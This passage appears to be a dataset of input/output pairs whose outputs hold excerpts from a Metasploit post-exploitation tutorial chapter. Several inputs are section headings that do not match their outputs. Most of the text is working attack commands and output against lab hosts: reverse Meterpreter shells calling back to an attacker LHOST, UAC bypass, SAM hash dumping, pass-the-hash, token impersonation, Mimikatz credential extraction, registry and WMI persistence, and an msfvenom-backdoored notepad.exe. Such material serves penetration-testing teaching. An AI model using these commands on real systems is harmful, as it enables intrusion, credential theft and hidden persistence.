windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(handler) > run -j\n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 192.168.216.5:4444\nmsf exploit(handler) >\n4. By starting the listener with run -j, it will run it in the context of a job, allowing\nus to continue using the msfconsole. To copy the backdoor to the target, we can\nuse the FTP File Server auxiliary module:\nmsf exploit(handler) > use auxiliary/server/ftp\nmsf auxiliary(ftp) > set FTPROOT /root\nFTPROOT => /root\nmsf auxiliary(ftp) > set FTPUSER Hacker\nFTPUSER => Hacker\nmsf auxiliary(ftp) > set FTPPASS\nset FTPPASS\nmsf auxiliary(ftp) > set FTPPASS S1mpl3P4ss\nFTPPASS => S1mpl3P4ss\nmsf auxiliary(ftp) > run -j\n[*] Auxiliary module running as background job 2.\nmsf auxiliary(ftp) >\n[*] Server started.\nmsf auxiliary(ftp) >\n[ 195 ]\nPost-Exploitation Chapter 5\n5. With the FTP server up and running, we can go to the Windows 7 target machine,\ndownload the backdoor, and execute it:\nIf everything went well, we should have a new Meterpreter session on the target\nmachine:\nmsf auxiliary(ftp) >\n[*] 192.168.216.137:49168 FTP download request for backdoor.exe\n[*] Sending stage (179267 bytes) to 192.168.216.137\n[*] Meterpreter session 1 opened (192.168.216.5:4444 ->\n192.168.216.137:49170) at 2017-11-25 09:14:39 -0500\nmsf exploit(handler) > sessions -i 1\n[*] Starting interaction with 1...\nmeterpreter > getuid\nServer username: IE11WIN7\\IEUser\nmeterpreter >\n6. Now that we have a session on the target machine, one of the first things we want\nis to try to elevate our privileges:\nmeterpreter > getsystem\n[-] priv_elevate_getsystem: Operation failed: Access is denied. The\nfollowing was attempted:\n[-] Named Pipe Impersonation (In Memory/Admin)\n[-] Named Pipe Impersonation (Dropper/Admin)\n[-] Token Duplication (In Memory/Admin)\nmeterpreter >\nHowever, privilege escalation using the getsystem command fails because of UAC.\n[ 196 ]"
  },
  {
    "input": "How to do it...",
    "output": "Post-Exploitation Chapter 5\nHow to do it...\nBefore we can use getsystem to perform a privilege escalation attack, we first need to\nbypass UAC. To list all the available exploits that will allow us to bypass UAC, we can use\nthe search command as follows:\nWithout going into detail about each exploitation technique, we will try to use the Windows\nEscalate UAC Protection Bypass to bypass Windows UAC by utilizing the trusted publisher\ncertificate through process injection. This module bypasses Windows UAC by utilizing the\ntrusted publisher certificate through process injection, spawning a second shell with the\nUAC flag turned off:\nmeterpreter > background\n[*] Backgrounding session 1...\nmsf exploit(handler) > use exploit/windows/local/bypassuac\nmsf exploit(bypassuac) > set SESSION 1\nSESSION => 1\nmsf exploit(bypassuac) > exploit\n[*] Started reverse TCP handler on 192.168.216.5:4444\n[*] UAC is Enabled, checking level...\n[+] UAC is set to Default\n[+] BypassUAC can bypass this setting, continuing...\n[+] Part of Administrators group! Continuing...\n[*] Uploaded the agent to the filesystem....\n[*] Uploading the bypass UAC executable to the filesystem...\n[*] Meterpreter stager executable 73802 bytes long being uploaded..\n[*] Sending stage (179267 bytes) to 192.168.216.137\n[*] Meterpreter session 2 opened (192.168.216.5:4444 ->\n192.168.216.137:49160) at 2017-11-25 09:27:16 -0500\nmeterpreter >\nGreat, we were able to bypass UAC, and we got a new Meterpreter session. As you can see,\nbypassing UAC is easy, which is why you should not rely on UAC as a security mechanism.\n[ 197 ]"
  },
  {
    "input": "How to do it...",
    "output": "Post-Exploitation Chapter 5\nDumping the contents of the SAM database\nSecurity Accounts Manager (SAM) is a database in the Windows operating system that\ncontains usernames and passwords; the passwords are stored in a hashed format in a\nregistry hive either as an LM hash or as an NTLM hash. This file can be found in\n%SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM. In this recipe, you\nwill learn about some of the most common ways to dump local user accounts from the SAM\ndatabase.\nGetting ready\nWe will start in a Meterperter session in the Metasploitable 3 target machine, with system\nprivileges running.\nHow to do it...\n1. First, we will start with the classic Meterpreter hashdump command:\n[ 198 ]\nPost-Exploitation Chapter 5\nBecause most post-exploitation tasks are being placed in their one post-\nexploitation module, let's take a look at the available options. The first module we\nwill check is the Windows Gather Local User Account Password Hashes\n(Registry) post-exploitation module, which will dump the local user accounts\nfrom the SAM database using the registry.\n2. To load the Windows Gather Local User Account Password Hashes (Registry)\npost-exploitation module, we first need to background our current Meterpreter\nsession and then load the module with the use command, set the session option,\nand run the module:\nmeterpreter > background\n[*] Backgrounding session 1...\nmsf exploit(psexec) > use post/windows/gather/hashdump\nmsf post(hashdump) > set SESSION 1\nSESSION => 1\nmsf post(hashdump) > run\n[*] Obtaining the boot key...\n[*] Calculating the hboot key using SYSKEY\n42b4df1cc96598ba45ddc5b022825099...\n[*] Obtaining the user list and keys...\n[*] Decrypting user keys...\n[*] Dumping password hints...\nNo users with password hints on this system\n[*] Dumping password hashes...\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f7\n1d913c245d35b50b:::\n...snip...\nkylo_ren:1018:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d324033\n1e94ae18b001:::\n[*] Post module execution completed\nmsf post(hashdump) >\n[ 199 ]"
  },
  {
    "input": "How to do it...",
    "output": "Post-Exploitation Chapter 5\n3. Next, we will use the Windows Gather Local and Domain Controller Account\nPassword Hashes. The post-exploitation module will dump the local accounts\nfrom the SAM database. If the target is a domain controller, it will dump the\ndomain account database using the proper technique depending on privilege\nlevel, OS, and role of the host:\nmsf post(hashdump) > use post/windows/gather/smart_hashdump\nmsf post(smart_hashdump) > set SESSION 1\nSESSION => 1\nmsf post(smart_hashdump) > run\n[*] Running module against VAGRANT-2008R2\n[*] Hashes will be saved to the database if one is connected.\n[+] Hashes will be saved in loot in JtR password file format to:\n[*]\n/root/.msf4/loot/20171125124532_default_192.168.216.10_windows.hash\nes_573050.txt\n...\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f7\n1d913c245d35b50b:::\n...snip...\nkylo_ren:1018:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d324033\n1e94ae18b001:::\n[*] Post module execution completed\nPassing the hash\nThe pass the hash technique allows us to authenticate to a remote server or service by passing\nthe hashed credentials directly without cracking them. This technique was first published\non Bugtraq back in 1997 by Paul Ashton in an exploit called NT Pass the Hash.\nHow to do it...\nTo perform a pass the hash attack, we can use the Microsoft Windows Authenticated User\nCode Execution exploit module and use the previous capture hash instead of the plaintext\npassword:\nmsf > use exploit/windows/smb/psexec\nmsf exploit(psexec) > set RHOST 192.168.216.10\nRHOST => 192.168.216.10\nmsf exploit(psexec) > set SMBUser Administrator\n[ 200 ]"
  },
  {
    "input": "How to do it...",
    "output": "Post-Exploitation Chapter 5\nSMBUser => Administrator\nmsf exploit(psexec) > set SMBPASS\naad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b\nSMBPASS =>\naad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b\nmsf exploit(psexec) > exploit\n...\n[*] Sending stage (179267 bytes) to 192.168.216.10\n[*] Meterpreter session 1 opened (192.168.216.5:4444 ->\n192.168.216.10:49293) at 2017-11-25 13:06:23 -0500\nmeterpreter >\nAs we can see from the output, the module is able to use the administrator username\nand password hash to execute an arbitrary payload.\nIncognito attacks with Meterpreter\nIncognito allows us to impersonate user tokens. It was first integrated into Metasploit first,\nthen to Meterpreter. In this recipe, we will be covering Incognito and use cases.\nTokens are similar to web cookies. They are also similar to temporary\nkeys, which allow us to enter the system and network without having to\nprovide authentication details each time. Incognito exploits this by\nreplaying that temporary key when asked to authenticate.\nThere are two types of tokens: delegate and impersonate.\ndelegate tokens are for interactive logins, whereas impersonate tokens\nare for noninteractive sessions.\nHow to do it...\n1. In a Meterpreter session running with system privileges, before using Incognito,\nwe will load the incognito Meterpreter extension, and then have a look at the\navailable options:\nmeterpreter > load incognito\nLoading extension incognito...Success.\nmeterpreter > help Incognito\n[ 201 ]\nPost-Exploitation Chapter 5\nIncognito Commands\n==================\nCommand Description\n------- -----------\nadd_group_user Attempt to add a user to a global group\nwith all tokens\nadd_localgroup_user Attempt to add a user to a local group\nwith all tokens\nadd_user Attempt to add a user with all tokens\nimpersonate_token Impersonate specified token\nlist_tokens List tokens available under current user\ncontext\nsnarf_hashes Snarf challenge/response hashes for every\ntoken\nmeterpreter >\n2. First, we will identify the valid tokens on the target system using\nthe list_tokens command with -u to list tokens by a unique username:\nmeterpreter > list_tokens -u\nDelegation Tokens Available\n========================================\nNT AUTHORITY\\IUSR\nNT AUTHORITY\\LOCAL SERVICE\nNT AUTHORITY\\NETWORK SERVICE\nNT AUTHORITY\\SYSTEM\nVAGRANT-2008R2\\sshd_server\nVAGRANT-2008R2\\vagrant\nImpersonation Tokens Available\n========================================\nNT AUTHORITY\\ANONYMOUS LOGON\nmeterpreter >\nTo have access to all the available tokens, you must be running with\nsystem privileges. Not even administrators have access to all the tokens.\nSo, for better results, try to escalate your privileges before using\nincognito.\n[ 202 ]"
  },
  {
    "input": "Getting ready",
    "output": "Post-Exploitation Chapter 5\n3. To impersonate an available token and assume its privileges, we will use\nthe impersonate_token command followed by the token we wish to\nimpersonate using two backslashes (this is required because just one slash causes\nbugs):\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter > impersonate_token VAGRANT-2008R2\\\\vagrant\n[+] Delegation token available\n[+] Successfully impersonated user VAGRANT-2008R2\\vagrant\nmeterpreter > getuid\nServer username: VAGRANT-2008R2\\vagrant\nmeterpreter >\nUsing the getuid command, we can see that we successfully impersonated a user\nnamed vagrant using Incognito\nIncognito proved to be one of my favorite tools because it allows us to rapidly escalate from\nlocal admin to domain user or even domain admin. By compromising a domain box with\nsystem privileges, we can wait or force a domain user to connect to the target machine and\nthen use Incognito to impersonate its token and assume its privileges.\nUsing Mimikatz\nMimikatz is a post-exploitation tool written by Benjamin Delpy which bundles together\nseveral of the most useful tasks that attackers perform. Mimikatz is one of the best tools to\ngather credential data from Windows systems.\nGetting ready\nMetasploit has two versions of Mimikatz available as Meterpreter extensions: version 1.o\nby loading the mimikatz extension, and the newer version 2.x by loading the kiwi\nextension. In this recipe, we will address the newer version and some of its most useful\ntasks.\n[ 203 ]"
  },
  {
    "input": "How to do it...",
    "output": "Post-Exploitation Chapter 5\nHow to do it...\n1. In a Meterpreter session running with system privileges, we will start by using\nthe load command to load the kiwi extension:\nmeterpreter > load kiwi\nLoading extension kiwi...\n.#####. mimikatz 2.1.1 20170608 (x64/windows)\n.## ^ ##. \"A La Vie, A L'Amour\"\n## / \\ ## /* * *\n## \\ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n'## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo)\n'#####' Ported to Metasploit by OJ Reeves `TheColonial` * * */\nSuccess.\nmeterpreter >\n2. Now that we have loaded the extension, we will list all the available commands\nusing the help kiwi command:\nmeterpreter > help kiwi\nKiwi Commands\n=============\nCommand Description\n------- -----------\ncreds_all Retrieve all credentials (parsed)\ncreds_kerberos Retrieve Kerberos creds (parsed)\ncreds_msv Retrieve LM/NTLM creds (parsed)\ncreds_ssp Retrieve SSP creds\ncreds_tspkg Retrieve TsPkg creds (parsed)\ncreds_wdigest Retrieve WDigest creds (parsed)\ndcsync Retrieve user account information via\n...\nlsa_dump_sam Dump LSA SAM (unparsed)\nlsa_dump_secrets Dump LSA secrets (unparsed)\npassword_change Change the password/hash of a user\nwifi_list List wifi profiles/creds for the current\nuser\nwifi_list_shared List shared wifi profiles/creds\n(requires SYSTEM)\nmeterpreter >\n[ 204 ]\nPost-Exploitation Chapter 5\n3. We will start by trying to retrieve the Kerberos credentials from the target\nmachine, using the creds_kerberos command:\nmeterpreter > creds_kerberos\n[+] Running as SYSTEM\n[*] Retrieving kerberos credentials\nkerberos credentials\n====================\nUsername Domain Password\n-------- ------ --------\n(null) (null) (null)\nsshd_server VAGRANT-2008R2 D@rj33l1ng\nvagrant VAGRANT-2008R2 vagrant\nvagrant-2008r2$ WORKGROUP (null)\nmeterpreter >\n4. Next, we will use the creds_msv command to retrieve the LM/NTLM hashes\nusing the MSV authentication package:\nOne of the features that helps Mimikatz become one of the most effective attack\ntools is its ability to retrieve cleartext passwords. After a user logs on,\ncredentials are stored in memory by the Local Security Authority Subsystem\nService (LSASS) process. Using Mimikatz, we are able to retrieve cleartext\ncredentials.\nStarting with Windows 8.1 and Windows Server 2012 R2, cleartext\ncredentials are no longer stored in memory.\n[ 205 ]\nPost-Exploitation Chapter 5\n5. To retrieve cleartext passwords, we can use the creds_wdigest command:\nmeterpreter > creds_wdigest\n[+] Running as SYSTEM\n[*] Retrieving wdigest credentials\nwdigest credentials\n===================\nUsername Domain Password\n-------- ------ --------\n(null) (null) (null)\nVAGRANT-2008R2$ WORKGROUP (null)\nsshd_server VAGRANT-2008R2 D@rj33l1ng\nvagrant VAGRANT-2008R2 vagrant\nMetasploit provides us with some built-in commands that allow us to use the\nmost common Mimikatz features, but, if we want full access to all the features in\nMimikatz, we can use the kiwi_cmd command.\n6. First, let's check the version of Mimikatz we are using, with the kiwi_cmd\nversion command:\nmeterpreter > kiwi_cmd version\nmimikatz 2.1.1 (arch x64)\nWindows NT 6.1 build 7601 (arch x64)\nmsvc 180021005 1\n7. To list all the available modules, we can try to load a non-existing module:\nmeterpreter > kiwi_cmd ::\nERROR mimikatz_doLocal ; \"\" module not found !\nstandard - Standard module [Basic commands (does not\nrequire module name)]\ncrypto - Crypto Module\nsekurlsa - SekurLSA module [Some commands to enumerate\ncredentials...]\n...\ndpapi - DPAPI Module (by API or RAW access) [Data\nProtection application programming interface]\nsysenv - System Environment Value module\nsid - Security Identifiers module\niis - IIS XML Config module\nrpc - RPC control of mimikatz\n[ 206 ]\nPost-Exploitation Chapter 5\n8. To query the available options for a specific module, we can use the following\nsyntax:\nmeterpreter > kiwi_cmd sekurlsa::\nERROR mimikatz_doLocal ; \"(null)\" command of \"sekurlsa\" module not\nfound !\nModule : sekurlsa\nFull name : SekurLSA module\nDescription : Some commands to enumerate credentials...\nmsv - Lists LM & NTLM credentials\nwdigest - Lists WDigest credentials\nkerberos - Lists Kerberos credentials\ntspkg - Lists TsPkg credentials\nlivessp - Lists LiveSSP credentials\nssp - Lists SSP credentials\nlogonPasswords - Lists all available providers credentials\nprocess - Switch (or reinit) to LSASS process context\nminidump - Switch (or reinit) to LSASS minidump context\n...\n9. Now that we know which module we wish to use and the available options, we\ncan use the kiwi_cmd command to list all the available credentials of the\nprovider with the sekurlsa module:\nmeterpreter > kiwi_cmd sekurlsa::logonpasswords\nAuthentication Id : 0 ; 742172 (00000000:000b531c)\nSession : Interactive from 1\nUser Name : vagrant\nDomain : VAGRANT-2008R2\nLogon Server : VAGRANT-2008R2\nLogon Time : 11/25/2017 10:19:08 AM\nSID : S-1-5-21-653170132-1988196614-1572848168-1000\nmsv :\n[00000003] Primary\n* Username : vagrant\n* Domain : VAGRANT-2008R2\n* LM : 5229b7f52540641daad3b435b51404ee\n* NTLM : e02bc503339d51f71d913c245d35b50b\n* SHA1 : c805f88436bcd9ff534ee86c59ed230437505ecf\n...\n[ 207 ]"
  },
  {
    "input": "How to do it...",
    "output": "Post-Exploitation Chapter 5\nThere's more...\nGolden Tickets and Mimikatz: Using Mimikatz, we can use the password information for\nthe KRBTGT account to create forged Kerberos tickets (TGTs) that can then be used to\nrequest TGS tickets for any service on any computer in the domain.\nAnother one of my favorite features is the ability to use Mimikatz to implant skeleton keys\nusing the misc module with the skeleton command, which will patch LSASS to enable the\nuse of a master password for any valid domain user.\nSetting up a persistence with backdoors\nIn this recipe, we will learn how to establish a persistent connection with our target,\nallowing us to connect to it at our will. As the attacker, we want to ensure we have access to\nour target no matter what and backdooring the target can be effective for setting persistent\nconnections.\nGetting ready\nMetasploit has several persistence modules available. In this recipe, we will have a look at\nsome local and post-exploitation modules that we can use to establish persistence on the\ntarget machine.\nHow to do it...\n1. The first module we will try is the Windows Registry Only Persistence exploit\nmodule. This module will install the complete payload in the registry, which will\nbe executed during booting up:\nmsf exploit(psexec) > use\nexploit/windows/local/registry_persistence\nmsf exploit(registry_persistence) > set SESSION 1\nSESSION => 1\nmsf exploit(registry_persistence) > set STARTUP SYSTEM\nSTARTUP => SYSTEM\nmsf exploit(registry_persistence) > set PAYLOAD\nwindows/meterpreter/reverse_https\nPAYLOAD => windows/meterpreter/reverse_https\nmsf exploit(registry_persistence) > set LHOST 192.168.216.5\n[ 208 ]\nPost-Exploitation Chapter 5\nLHOST => 192.168.216.5\nmsf exploit(registry_persistence) > set LPORT 443\nLPORT => 443\nmsf exploit(registry_persistence) > exploit\n...\n[*] Clean up Meterpreter RC file:\n/root/.msf4/logs/persistence/192.168.216.10_20171126.2103/192.168.2\n16.10_20171126.2103.rc\nmsf exploit(registry_persistence) >\nNow we just need to set up a listener and wait for the target machine to reboot.\n2. Another persistence module we will use is the WMI Event Subscription\nPersistence local exploit module:\nmeterpreter > migrate -N explorer.exe\n[*] Migrating from 5280 to 5672...\n[*] Migration completed successfully.\nmeterpreter > background\n[*] Backgrounding session 1...\nmsf exploit(psexec) > use exploit/windows/local/wmi_persistence\nset SESSION 1\nSESSION => 1\nmsf exploit(wmi_persistence) > set PAYLOAD\nwindows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(wmi_persistence) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(wmi_persistence) > set LPORT 443\nLPORT => 443\n[*] Installing Persistence...\n[+] - Bytes remaining: 12260\n[+] - Bytes remaining: 4260\n[+] Payload successfully staged.\n[+] Persistence installed! Call a shell using \"smbclient\n\\\\\\\\192.168.216.10\\\\C$ -U BOB <arbitrary password>\"\n[*] Clean up Meterpreter RC file:\n/root/.msf4/logs/wmi_persistence/192.168.216.10_20171127.1028/192.1\n68.216.10_20171127.1028.rc\nmsf exploit(wmi_persistence) >\n[ 209 ]"
  },
  {
    "input": "Becoming TrustedInstaller",
    "output": "Post-Exploitation Chapter 5\n3. With our persistence in place, we need to start a listener using the Generic\nPayload Handler module:\nmsf exploit(wmi_persistence) > use exploit/multi/handler\nmsf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(handler) > set LPORT 443\nLPORT => 443\nmsf exploit(handler) > run\n[*] Started reverse TCP handler on 192.168.216.5:443\n4. To get a session back, we need to generate an event ID 4625 (an account failed to\nlog on) with the username BOB, which will trigger the payload. For that, we will\nuse the smbclient command:\nroot@kali:~# smbclient \\\\\\\\192.168.216.10\\\\C$ -U BOB BLA\nWARNING: The \"syslog\" option is deprecated\nsession setup failed: NT_STATUS_LOGON_FAILURE\nroot@kali:~#\n5. Back in the msfconsole, we should receive a new Meterpreter session:\n[*] Sending stage (179267 bytes) to 192.168.216.10\n[*] Meterpreter session 2 opened (192.168.216.5:443 ->\n192.168.216.10:50036) at 2017-11-27 16:11:29 -0500\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter >\nBecoming TrustedInstaller\nAnother way to gain persistence is to backdoor a service binary. So, let's try to backdoor a\nWindows binary in the Windows 10 target machine.\n[ 210 ]"
  },
  {
    "input": "How to do it...",
    "output": "Post-Exploitation Chapter 5\nHow to do it...\n1. First, we will download notepad.exe to our Kali machine using the download\ncommand:\nmeterpreter > pwd\nC:\\Windows\\system32\nmeterpreter > download notepad.exe\n[*] Downloading: notepad.exe -> notepad.exe\n[*] Downloaded 227.00 KiB of 227.00 KiB (100.0%): notepad.exe ->\nnotepad.exe\n[*] download : notepad.exe -> notepad.exe\nmeterpreter >\nUse the pwd command to make sure you are on\nthe C:\\Windows\\system32 directory where notepad.exe is located. If\nnot, use the cd command to change to the proper directory (don't forget to\nuse double backslashes): C:\\\\Windows\\\\system32.\n2. Now that we have a copy of the binary, let's try to remove the original:\nmeterpreter > getsystem\n...got system via technique 1 (Named Pipe Impersonation (In\nMemory/Admin)).\nmeterpreter > rm notepad.exe\n[-] stdapi_fs_delete_file: Operation failed: Access is denied.\nmeterpreter >\nAs you can see, although we are running with system privileges, we are unable to\ndelete the original file. This happens because of TrustedInstaller, a Windows\nModule Installer service which is part of Windows Resource Protection. This\nrestricts access to certain core system files, folders, and registry keys that are part\nof the Windows OS.\n3. So, before we can backdoor the service, we need to remove the original file. For\nthat, we will use the steal_token Meterpreter command to steal the\nauthentication token and gain the privileges of TrustedInstaller. First, we will\nstart the TrustedInstaller service:\nmeterpreter > shell\nProcess 4836 created.\nChannel 2 created.\nMicrosoft Windows [Version 10.0.10586]\n(c) 2016 Microsoft Corporation. All rights reserved.\n[ 211 ]"
  },
  {
    "input": "Backdooring Windows binaries",
    "output": "Post-Exploitation Chapter 5\nC:\\Windows\\system32>sc start TrustedInstaller\nsc start TrustedInstaller\n...\nIGNORES_SHUTDOWN)\nWIN32_EXIT_CODE : 0 (0x0)\nSERVICE_EXIT_CODE : 0 (0x0)\nCHECKPOINT : 0x0\nWAIT_HINT : 0x7d0\nPID : 3420\nFLAGS :\nC:\\Windows\\system32>\n4. With the service up and running, we can use the ps command to get the PID of\nthe TrustedInstaller, use the steal_token followed by the PID to steal the\ntoken, and finally remove the original notepad.exe file:\nGreat! Now that we have successfully removed the binary, let's move on to the next recipe\nand see how we can backdoor it.\nBackdooring Windows binaries\nBy backdooring system binaries, we can ensure that we will have persistence in the target\nmachine, and we won't trigger alarms by adding new registry entries or new binaries to the\nsystem.\n[ 212 ]"
  },
  {
    "input": "How to do it...",
    "output": "Post-Exploitation Chapter 5\nHow to do it...\n1. We will use msfvenom to backdoor the notepad.exe binary:\nUse -a for the architecture, in this case, x86\n--platform for the platform of the payload Windows\n-p, for the payload to use windows/meterpreter/reverse_tcp,\nLHOST followed by the IP address of our Kali machine\n-x to specify a custom executable file to use as a template; in this\nrecipe, we will use notepad.exe\n-k to preserve the template behavior and inject the payload as a new\nthread\n-f for the output format\n-b to specify characters to avoid; in this case, null bytes \"\\x00\" and -o\nfor the output name of the payload:\nroot@kali:~# msfvenom -a x86 --platform Windows -p\nwindows/meterpreter/reverse_tcp LHOST=192.168.216.5 -x notepad.exe\n-k -f exe -b \"\\x00\" -o notepad-backdoored.exe\nFound 10 compatible encoders\nAttempting to encode payload with 1 iterations of\nx86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 360 (iteration=0)\nx86/shikata_ga_nai chosen with final size 360\nPayload size: 360 bytes\nFinal size of exe file: 353280 bytes\nSaved as: notepad-backdoored.exe\nroot@kali:~#\n2. Now that we have backdoored the notepad.exe binary, we will go back to the\nMeterpreter session and upload our backdoor:\nmeterpreter > upload notepad-backdoored.exe\n[*] uploading : notepad-backdoored.exe -> notepad-backdoored.exe\n[*] uploaded : notepad-backdoored.exe -> notepad-backdoored.exe\nmeterpreter > mv notepad-backdoored.exe notepad.exe\nmeterpreter >\n[ 213 ]\nPost-Exploitation Chapter 5\n3. Then, we need to start a listener so we can get a new Meterpreter session every\ntime the user launches notepad.exe:\nmeterpreter > background\n[*] Backgrounding session 1...\nmsf exploit(web_delivery) > use exploit/multi/handler\nmsf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(handler) > run -j\n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 192.168.216.5:4444\nmsf exploit(handler) >\n4. To test the backdoor, log into the Windows 10 target machine and start\nnotepad.exe:\nmsf exploit(handler) > [*] Sending stage (179267 bytes) to\n192.168.216.145\n[*] Meterpreter session 2 opened (192.168.216.5:4444 ->\n192.168.216.145:49721) at 2017-12-08 04:15:07 -0500\nmsf exploit(handler) > sessions 2\n[*] Starting interaction with 2...\nmeterpreter > getpid\nCurrent pid: 4228\nmeterpreter > ps notepad.exe\nFiltering on 'notepad.exe'\nProcess List\n============\nPID PPID Name Arch Session User Path\n--- ---- ---- ---- ------- ---- ----\n4228 3304 notepad.exe x86 1 DESKTOP-OJI4NFS\\User\nC:\\Windows\\System32\\notepad.exe\nmeterpreter >\nNow whenever the user launches notepad.exe, we will get a new Meterpreter\nsession.\n[ 214 ]"
  },
  {
    "input": "Getting ready",
    "output": "Post-Exploitation Chapter 5\nPivoting with Meterpreter\nSo far, Meterpreter has proven to be one of the most powerful tools for post-exploitation. In\nthis recipe, we will cover another useful technique called pivoting. Let's begin with the\nrecipe by first understanding the meaning of pivoting, why is it needed, and how\nMetasploit can be useful for pivoting.\nGetting ready\nBefore starting with the recipe, let's first understand pivoting in detail. Pivoting refers to the\nmethod used by penetration testers which uses a compromised system to attack other\nsystems on the same network. This is a multilayered attack in which we can even access\nareas of the network that are only available for local internal use, such as the intranet.\nConsider the scenario shown in the following diagram:\nThe attacker can compromise a web server that is connected to the internet. Then, the\nattacker uses the compromised server to access the internal network. This is a typical\nscenario that involves pivoting. In our lab, we use a dual home server to simulate an\ninternet-facing server with access to the LAN network; this way we avoid the installation of\nanother machine to act as the firewall.\nTo set up the Windows 10 client machine for this recipe, we first need to configure the\nnetwork adapter of the virtual machine to use the 10.0.0.0/24 network by changing the\ninterface from NAT to the custom network. Then, we will disable the Windows 10 firewall\nand add a new registry key that allows us to use the Microsoft Windows Authenticated\nUser Code Execution attack as if the client was part of a domain.\n[ 215 ]\nPost-Exploitation Chapter 5\nAdd a new DWORD (32-bit) key named LocalAccountTokenFilterPolicy to\nHKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/S\nystem and set the value to 1:\n[ 216 ]"
  },
  {
    "input": "How to do it...",
    "output": "Post-Exploitation Chapter 5\nHow to do it...\n1. First, we will target the Linux server using the Samba \"username map script\"\nCommand Execution exploit, which we've used already:\nmsf > use exploit/multi/samba/usermap_script\nmsf exploit(usermap_script) > set RHOST 192.168.216.129\nRHOST => 192.168.216.129\nmsf exploit(usermap_script) > exploit\n[*] Started reverse TCP double handler on 192.168.216.5:4444\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo TdPeM5eMnWjlpuK5;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket B\n[*] B: \"TdPeM5eMnWjlpuK5\\r\\n\"\n[*] Matching...\n[*] A is input...\n[*] Command shell session 1 opened (192.168.216.5:4444 ->\n192.168.216.129:41027) at 2017-12-08 06:35:53 -0500\n^Z\nBackground session 1? [y/N] y\nmsf exploit(usermap_script) >\n2. Now that we have a session, we will use the sessions command with the -u\noption to upgrade the shell to a Meterpreter session:\nmsf exploit(usermap_script) > sessions -u 1\n[*] Executing 'post/multi/manage/shell_to_meterpreter' on\nsession(s): [1]\n[*] Upgrading session ID: 1\n[*] Starting exploit/multi/handler\n[*] Started reverse TCP handler on 192.168.216.5:4433\n[*] Sending stage (847604 bytes) to 192.168.216.129\n[*] Meterpreter session 2 opened (192.168.216.5:4433 ->\n192.168.216.129:41205) at 2017-12-08 06:37:08 -0500\n[*] Sending stage (847604 bytes) to 192.168.216.129\n[*] Meterpreter session 3 opened (192.168.216.5:4433 ->\n192.168.216.129:41206) at 2017-12-08 06:37:13 -0500\n[*] Command stager progress: 100.00% (736/736 bytes)\nmsf exploit(usermap_script) >\n[ 217 ]\nPost-Exploitation Chapter 5\n3. With our newly created Meterpreter session, we can use the ifconfig command\non the target to see the available interfaces:\nmsf exploit(usermap_script) > sessions 2\n[*] Starting interaction with 2...\nmeterpreter > ifconfig\nInterface 1\n============\nName : lo\nHardware MAC : 00:00:00:00:00:00\nMTU : 16436\nFlags : UP,LOOPBACK\nIPv4 Address : 127.0.0.1\nIPv4 Netmask : 255.0.0.0\nIPv6 Address : ::1\nIPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::\n...\nmeterpreter >\nAs you can see, the target node has three interfaces. The LOOPBACK interface, one\nwith the IP address of 192.168.216.129, which is connected to the internet, and\nthe other with 10.0.0.128, which is the IP interface for the internal network.\n4. Our next aim will be to find which systems are available on this local network. To\ndo this, we will use the Multi Gather Ping Sweep post-exploitation module:\nmeterpreter > background\n[*] Backgrounding session 2...\nmsf exploit(usermap_script) > use post/multi/gather/ping_sweep\nmsf post(ping_sweep) > set RHOSTS 10.0.0.0/24\nRHOSTS => 10.0.0.0/24\nmsf post(ping_sweep) > set SESSION 2\nSESSION => 2\nmsf post(ping_sweep) > run\n[*] Performing ping sweep for IP range 10.0.0.0/24\n[+] 10.0.0.161 host found\n[*] Post module execution completed\nmsf post(ping_sweep) >\nThe module was able to discover a new host on the network. Let's try to pivot and\ncompromise that host.\n[ 218 ]"
  },
  {
    "input": "How it works...",
    "output": "Post-Exploitation Chapter 5\nHow it works...\nTo access the target in the 10.0.0.0/24 network, we will have to route all the packets\nthrough the compromised Linux machine with the IP 192.168.216.129.\n1. To do this, we will use the route command, which will route traffic destined to a\ngiven subnet through a supplied session:\nmsf post(ping_sweep) > route add 10.0.0.0/24 2\n[*] Route added\nmsf post(ping_sweep) > route print\nIPv4 Active Routing Table\n=========================\nSubnet Netmask Gateway\n------ ------- -------\n10.0.0.0 255.255.255.0 Session 2\n[*] There are currently no IPv6 routes defined.\nmsf post(ping_sweep) >\nLook at the parameters of the route command. The add parameter will add the\ndetails to the routing table. Then, we provided the address of the target network\nfollowed by the Meterpreter session ID, which we will use to access the network\nin recipe session 2.\n2. Now, you can do a quick port scan on the IP address 10.0.0.161 using the TCP\nPort Scanner auxiliary module:\nmsf post(ping_sweep) > use auxiliary/scanner/portscan/tcp\nmsf auxiliary(tcp) > set RHOSTS 10.0.0.161\nRHOSTS => 